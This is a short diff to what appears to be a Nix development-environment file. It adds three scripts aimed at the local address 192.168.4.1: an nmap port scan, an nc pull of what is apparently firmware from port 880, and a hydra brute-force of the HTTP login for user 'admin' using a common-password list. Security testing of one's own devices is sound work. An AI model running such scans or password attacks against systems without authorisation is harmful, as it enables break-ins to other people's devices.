@@ -84,6 +84,28 @@
     repl
   '';
 
+  scripts.portmap.exec = ''
+    set -x
+    nmap 192.168.4.1
+  '';
+
+  scripts.extracfw.exec = ''
+    set -x
+    nc 192.168.4.1 880 > fw
+  '';
+
+  scripts.bforce.exec = ''
+    set -x
+    hydra \
+      -I \
+      -t 1 \
+      -l admin \
+      -P "${./10000_common_passwords}" \
+      http-get://192.168.4.1
+  '';
+
+
+
   enterShell = ''
   '';
 
